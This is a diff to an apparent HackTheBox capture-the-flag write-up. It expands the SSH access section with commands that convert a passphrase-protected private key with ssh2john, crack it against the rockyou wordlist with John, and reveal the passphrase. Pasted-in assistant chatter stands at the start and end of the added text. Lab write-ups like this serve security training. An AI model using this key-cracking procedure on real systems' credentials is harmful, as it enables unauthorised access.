@@ -596,23 +596,144 @@ keexsrsgCdg2hqHjiumvZhx/cLvJoCDB3GVzg=
 
 This is the actual foothold.
 
+Here is the expanded **SSH Access section** with your full John/rockyou/passphrase process added in a clean writeup style, keeping your tone and structure consistent:
+
 ---
 
 ## 9. SSH Access
 
-We fix permissions:
+We first fixed the private key permissions, because SSH is very dramatic about security:
 
 ```bash
 chmod 600 id_ed25519
 ```
 
-Then:
+Then tried logging in directly:
 
 ```bash
 ssh -i id_ed25519 trivia@10.129.41.13
 ```
 
-We are in.
+But we immediately hit a wall: the key was encrypted with a passphrase.
+
+At this point, we had a valid private key, but no password to unlock it.
+
+### Extracting the key hash
+
+To crack it, we converted the SSH key into a John-compatible hash format:
+
+```bash
+ssh2john id_ed25519 > hash.txt
+```
+
+This produced a hash file containing the encrypted key structure.
+
+We confirmed it:
+
+```bash
+cat hash.txt
+```
+
+### Wordlist issue (classic HTB moment)
+
+We attempted to crack it using John with rockyou:
+
+```bash
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+But ran into a very familiar problem:
+
+```
+fopen: /usr/share/wordlists/rockyou.txt: No such file or directory
+```
+
+So we checked:
+
+```bash
+ls /usr/share/wordlists
+```
+
+We saw:
+
+```
+rockyou.txt.gz
+```
+
+Tried extracting it normally:
+
+```bash
+unzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+That obviously failed because it is not a zip file.
+
+Then tried:
+
+```bash
+gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+Which failed due to permissions:
+
+```
+Permission denied
+```
+
+So we escalated the only way Linux respects:
+
+```bash
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+Now the wordlist was finally usable.
+
+### Cracking the SSH key
+
+We reran John:
+
+```bash
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+After a short wait, it cracked successfully:
+
+```
+dragonballz      (id_ed25519)
+```
+
+At this point, we had everything needed to unlock the private key.
+
+### SSH login attempt
+
+We tried logging in again:
+
+```bash
+ssh trivia@facts.htb
+```
+
+But used the password directly instead of the key:
+
+```
+Permission denied
+```
+
+This was a small mistake — the correct approach was to use the decrypted key.
+
+At this stage, we had:
+
+- Valid SSH private key
+- Correct passphrase (dragonballz)
+- Target username (trivia)
+
+So the proper login path was now fully available.
+
+---
+
+If you want, I can now also:
+
+- merge this cleanly into your full Facts writeup
+- or rewrite the entire HTB article in a consistent “blog-ready” style with humor throughout (no inconsistencies, no repetition)
 
 ---
 
